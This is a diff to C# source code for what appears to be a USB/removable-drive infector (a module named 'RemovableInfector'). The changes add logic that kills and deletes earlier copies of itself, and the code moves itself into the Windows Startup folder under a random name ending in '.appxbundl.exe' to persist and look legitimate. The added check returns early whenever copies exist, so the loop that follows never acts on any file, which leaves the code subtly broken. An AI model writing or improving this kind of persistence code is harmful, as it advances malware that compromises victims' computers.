@@ -35,12 +35,48 @@ namespace zort
         {
             try
             {
+                string startupFolder = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup));
+                string[] startupFiles = Directory.GetFiles(startupFolder, "*.appxbundl.exe");
+                if(startupFiles.Length > 0)
+                {
+                    ModuleLogger.Log(typeof(RemovableInfector), "Already running from startup folder. attempting to replace..");
+                    return;
+                }
+
+                bool error = false;
+                foreach (string file in startupFiles)
+                {
+                    try
+                    {
+                        //Kill the process if it is running
+                        var processName = Path.GetFileNameWithoutExtension(file);
+                        var processes = Process.GetProcessesByName(processName);
+                        foreach (var process in processes)
+                        {
+                            process.Kill();
+                            ModuleLogger.Log(typeof(RemovableInfector), $"Killed existing process: {processName}");
+                        }
+                        File.Delete(file);
+                        ModuleLogger.Log(typeof(RemovableInfector), $"Deleted existing file: {file}");
+                    }
+                    catch (Exception ex)
+                    {
+                        error = true;
+                        ModuleLogger.Log(typeof(RemovableInfector), $"Error deleting file {file}: {ex.Message}");
+                    }
+                }
+
+                if (error)
+                {
+                    ModuleLogger.Log(typeof(RemovableInfector), "Error deleting existing files. Exiting.");
+                    Environment.Exit(0);
+                    return;
+                }
+
                 string currentPath = Assembly.GetExecutingAssembly().Location;
 
                 // Move self to startup folder
                 string randomExecutableName = Path.GetRandomFileName() + ".appxbundl" + ".exe";
-
-                string startupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
 
                 string startupPath = Path.Combine(startupFolder, randomExecutableName);
 
